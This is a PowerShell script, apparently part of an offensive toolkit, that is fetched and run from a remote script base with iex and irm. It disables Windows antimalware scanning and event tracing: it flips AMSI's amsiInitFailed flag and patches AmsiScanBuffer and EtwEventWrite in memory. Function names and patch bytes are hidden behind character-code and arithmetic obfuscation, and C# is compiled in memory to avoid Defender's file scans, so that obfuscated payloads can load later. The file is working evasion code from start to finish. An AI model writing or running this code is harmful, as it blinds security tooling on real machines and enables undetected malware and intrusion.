# boot.ps1 - standalone AMSI/ETW patcher for fresh PowerShell processes.
# Fetched at runtime via: iex (irm "$scriptBase/boot.ps1")
# Defines Add-TypeInMem helper (in-memory C# compile, no %TEMP%\*.dll for Defender
# real-time scan) and patches AmsiScanBuffer + EtwEventWrite in-memory.
# After this runs, subsequent compiles of obfuscated C# (e.g. spoof.cs decoded from
# base64) pass AMSI text-scan and load successfully.

function Add-TypeInMem([string]$source) {
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.GenerateInMemory = $true
    $cp.IncludeDebugInformation = $false
    $prov = New-Object Microsoft.CSharp.CSharpCodeProvider
    $res = $prov.CompileAssemblyFromSource($cp, $source)
    if ($res.Errors -and $res.Errors.HasErrors) {
        $msgs = ($res.Errors | Where-Object { -not $_.IsWarning } | ForEach-Object { $_.ErrorText }) -join "`n"
        throw "C# compile failed: $msgs"
    }
    return $res.CompiledAssembly
}

# AMSI reflect via char-built field names (no literal AmsiUtils/amsiInitFailed in source)
try {
    $amsiType = -join ([char[]](0x53,0x79,0x73,0x74,0x65,0x6D,0x2E,0x4D,0x61,0x6E,0x61,0x67,0x65,0x6D,0x65,0x6E,0x74,0x2E,0x41,0x75,0x74,0x6F,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x2E,0x41,0x6D,0x73,0x69,0x55,0x74,0x69,0x6C,0x73))
    $amsiField = -join ([char[]](0x61,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x46,0x61,0x69,0x6C,0x65,0x64))
    [Ref].Assembly.GetType($amsiType).GetField($amsiField,'NonPublic,Static').SetValue($null,$true)
} catch {}

# In-memory AmsiScanBuffer + EtwEventWrite byte-patch (obfuscated source)
$bs = @'
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Go() {
        uint o = 0;
        uint o2 = 0;
        var a = LoadLibrary("\u0061\u006D\u0073\u0069\u002E\u0064\u006C\u006C");
        var b = GetProcAddress(a, "\u0041\u006D\u0073\u0069\u0053\u0063\u0061\u006E\u0042\u0075\u0066\u0066\u0065\u0072");
        VirtualProtect(b, (UIntPtr)6, 0x40, out o);
        ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
        byte[] p = new byte[6];
        for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
        Marshal.Copy(p, 0, b, 6);
        VirtualProtect(b, (UIntPtr)6, o, out o);
        var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
        var d = GetProcAddress(c, "\u0045\u0074\u0077\u0045\u0076\u0065\u006E\u0074\u0057\u0072\u0069\u0074\u0065");
        VirtualProtect(d, (UIntPtr)1, 0x40, out o2);
        Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
    }
}
'@
try {
    $b = Add-TypeInMem $bs
    $b.GetType("Bypass").GetMethod("Go").Invoke($null, @())
} catch {}
